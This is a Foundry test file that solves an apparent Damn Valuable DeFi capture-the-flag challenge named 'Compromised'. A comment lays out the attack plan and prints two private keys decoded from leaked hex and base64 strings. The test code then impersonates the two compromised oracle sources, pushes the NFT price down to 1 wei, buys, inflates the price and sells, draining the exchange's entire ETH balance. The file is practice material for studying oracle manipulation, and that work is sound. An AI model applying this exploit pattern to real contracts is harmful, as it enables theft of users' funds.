//SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";

import {Exchange} from "../src/7. compromised/Exchange.sol";
import {TrustfulOracle} from "../src/7. compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../src/7. compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../src/DamnValuableNFT.sol";
import {Attack} from "../src/7. compromised/Attack.sol";
/* 
ATTACK PLAN

1. decoding strings of hexdecimal characters (given in the hint ) to ASCII
    1. MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
    2. MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4

2. base64 --decode  => will yield private keys (32 byte long)
    1. 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
    2. 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

3. Pasting them into eth-toolbox.com provides the Eth wallet address (20 byte long)
    1. 0xe92401a4d3af5e446d93d11eec806b1462b39d15 
    2. 0x81a5d6e50c214044be44ca0cb057fe119097850c
*/

contract CompromisedAttackTest is StdCheats, Test {

    Exchange public exchange;
    TrustfulOracle public oracle;
    TrustfulOracleInitializer public oracleInit;
    DamnValuableNFT public nftContract;
    Attack public attacker;

    uint256 public constant EXCHANGE_INITIAL_ETH_BALANCE = 9999 ether;
    uint256 public constant INITIAL_NFT_PRICE = 999 ether ;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 1 * 10 ** 17;    // 0.1 ether
    uint256 public constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] public sources =  [
        0xA73209FB1a42495120166736362A1DfA9F95A105,
        0xe92401A4d3af5E446d93D11EEc806b1462b39D15,
        0x81A5D6E50C214044bE44cA0CB057fe119097850c
        ];

    string[] public symbol = ['DVNFT', 'DVNFT', 'DVNFT'];

    uint256[] public initialPrices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];


    function setUp() public {

        oracleInit = new TrustfulOracleInitializer(sources, symbol, initialPrices);
        oracle = oracleInit.oracle();       

        exchange = new Exchange(address(oracle));
        nftContract = exchange.token();

        attacker = new Attack(address(exchange), address(nftContract));

        for(uint i=0; i < sources.length; i++) {

            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        vm.deal(address(attacker), PLAYER_INITIAL_ETH_BALANCE);
        vm.deal(address(exchange), EXCHANGE_INITIAL_ETH_BALANCE);
    }

    function testSetUp() public {

        console.log("THIS ADDRESS :", address(this));
        console.log("MSG SENDER :", msg.sender);
        console.log("Oracle INIT :", address(oracleInit));
        console.log("Oracle :", address(oracle));
        
        console.log("Exchange :", address(exchange));
        console.log("NftContract :", address(nftContract));       
        console.log("Attacker :", address(attacker));       
        
        console.log("Exchange Balance (before attack):", address(exchange).balance);
        console.log("Attacker Balance (before attack):", address(attacker).balance);
        
        assertEq(nftContract.owner(), address(0));       // ownership renounced
        assertEq(nftContract.rolesOf(address(exchange)), nftContract.MINTER_ROLE());


        for(uint i=0; i < sources.length; i++) {

            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

         assertEq(address(attacker).balance , PLAYER_INITIAL_ETH_BALANCE);
    }


    function testAttackOracle() public {

        // since we know the cryptic messages lead to the 
        // private keys of 2 trusted oracle addresses

        // We are going to take the shortcut and use the cheatcode for this setUp
        // we need 2 trusted oracles to successfully change the median prices

        // can be improved to somehow use the private key to sign a transaction from the attacking contract itself
        vm.startPrank(sources[1]);
        oracle.postPrice('DVNFT', 1);
        vm.stopPrank();

        vm.startPrank(sources[2]);
        oracle.postPrice('DVNFT', 1);
        vm.stopPrank();        

        assertEq(oracle.getMedianPrice('DVNFT'), 1);  // price cannot be 0 as per the exchange contract

        attacker.attackBuy();

        // setting price to 9999 ether
        vm.startPrank(sources[1]);
        oracle.postPrice('DVNFT', 9999 ether + 1);      
        vm.stopPrank();

        vm.startPrank(sources[2]);
        oracle.postPrice('DVNFT', 9999 ether + 1);
        vm.stopPrank(); 


        attacker.attackSell();

        console.log("Exchange Balance (after attack):", address(exchange).balance);
        console.log("Attacker Balance (after attack):", address(attacker).balance);

        assertEq(address(attacker).balance , 9999 ether + PLAYER_INITIAL_ETH_BALANCE );
        assertEq(address(exchange).balance, 0);

        vm.startPrank(sources[1]);
        oracle.postPrice('DVNFT', INITIAL_NFT_PRICE);      
        vm.stopPrank();

        vm.startPrank(sources[2]);
        oracle.postPrice('DVNFT', INITIAL_NFT_PRICE);
        vm.stopPrank(); 

        assertEq(nftContract.balanceOf(address(attacker)) , 0);       // NFT balance of attacker is back to 0
        assertEq(oracle.getMedianPrice('DVNFT'),  INITIAL_NFT_PRICE); // NFT price is set to initial price
    }

}
